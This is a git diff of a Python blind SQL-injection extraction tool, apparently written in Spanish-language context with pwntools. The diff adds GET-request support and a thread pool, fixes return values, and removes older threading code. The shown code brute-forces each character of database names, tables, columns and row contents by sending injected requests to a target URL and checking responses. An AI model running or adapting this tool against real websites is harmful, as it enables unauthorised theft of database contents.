@@ -7,8 +7,6 @@ import time
 import os
 import re
 import math
-import threading
-import multiprocessing
 import concurrent.futures
 import copy
 from pwn import *
@@ -106,26 +104,30 @@ def build_data(info_name, position, db, table):
     characters = list(range(33, 127))
 
     for character in characters:
-        payload = f"{post_data[post_data_exploit]}{build_payload(info_name,position,character, db, table)}"
-        data = copy.copy(post_data)
-        data[post_data_exploit] = payload
-        result.append(WrapperRequest(data, character))
+        if method == "POST":
+            payload = f"{post_data[post_data_exploit]}{build_payload(info_name,position,character, db, table)}"
+            data = copy.copy(post_data)
+            data[post_data_exploit] = payload
+            result.append(WrapperRequest(data, character))
+        else:
+            result.append(
+                f"{main_url}{build_payload(info_name,position,character, db, table)}"
+            )
 
     return result
 
 
 def send_request(requests_data):
 
-    response = requests.post(main_url, headers=headers, data=requests_data.data)
+    if method == "POST":
+        response = requests.post(main_url, headers=headers, data=requests_data.data)
+    else:
+        response = requests.get(requests_data, headers=headers)
     return WrapperResponse(response.text, requests_data.character)
-    # responses.append(WrapperResponse(response.text, character))
 
 
 def get_info(label_info, label_menu, info_name, db=None, table=None):
 
-    # num_processes = multiprocessing.cpu_count()
-    num_processes = 1
-    print(f"Procesadores: {num_processes}")
     info = ""
     position = 1
     find_characters = True
@@ -135,12 +137,7 @@ def get_info(label_info, label_menu, info_name, db=None, table=None):
 
         requests_data = build_data(info_name, position, db, table)
 
-        # with multiprocessing.Pool(num_processes) as pool:
-        # responses = pool.map(send_request, requests_data)
-
-        with concurrent.futures.ThreadPoolExecutor(
-            max_workers=num_processes
-        ) as executor:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
             responses = list(executor.map(send_request, requests_data))
 
         for response in responses:
@@ -153,41 +150,7 @@ def get_info(label_info, label_menu, info_name, db=None, table=None):
 
         position += 1
 
-
-"""
-        while notFindCharacters and len(characters) != 0:
-
-            for _ in range(num_threads):
-
-                if len(characters) == 0 or not notFindCharacters:
-                    break
-
-                character = characters.pop()
-                payload = f"{post_data[post_data_exploit]}{set_payload(info_name,position,character, db, table)}"
-                data = copy.copy(post_data)
-                data[post_data_exploit] = payload
-
-                label_menu.status(f"position: {position}, character: {chr(character)}")
-
-                thread = threading.Thread(
-                    target=send_request,
-                    args=(data, character),
-                )
-                threads.append(thread)
-                thread.start()
-
-            for thread in threads:
-                thread.join()
-
-            for response in responses:
-                if condition in response.text:
-                    print(f"find character: {response.character}")
-                    info += chr(response.character)
-                    label_info.status(f"{Color.GREEN}{info}{Color.END}")
-                    notFindCharacters = False
-                    responses.clear()
-                    break
-"""
+    return info
 
 
 def get_user(label_menu):
@@ -199,7 +162,7 @@ def get_dbs(label_menu):
     global dbs
 
     label_info = log.progress(Color.YELLOW + "DBs" + Color.END)
-    get_info(label_info, label_menu, "DBs")
+    info = get_info(label_info, label_menu, "DBs")
 
     new_dbs = info.split(",")
     for db_name in new_dbs:
@@ -217,7 +180,7 @@ def get_tables(label_menu):
         label_info = log.progress(
             f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Tables{Color.END}"
         )
-        get_info(label_info, label_menu, "Tables", db)
+        info = get_info(label_info, label_menu, "Tables", db)
 
         new_tables = info.split(",")
         for table_name in new_tables:
@@ -237,7 +200,7 @@ def get_columns(label_menu):
             label_info = log.progress(
                 f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Columns{Color.END}"
             )
-            get_info(label_info, label_menu, "Columns", db, table)
+            info = get_info(label_info, label_menu, "Columns", db, table)
 
             new_columns = info.split(",")
             for column_name in new_columns:
@@ -257,7 +220,7 @@ def get_rows(label_menu):
                 f"{Color.BOLD}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Rows{Color.END}"
             )
 
-            get_info(label_info, label_menu, "Rows", db, table)
+            info = get_info(label_info, label_menu, "Rows", db, table)
 
             new_rows = info.split(",")
             for row in new_rows:
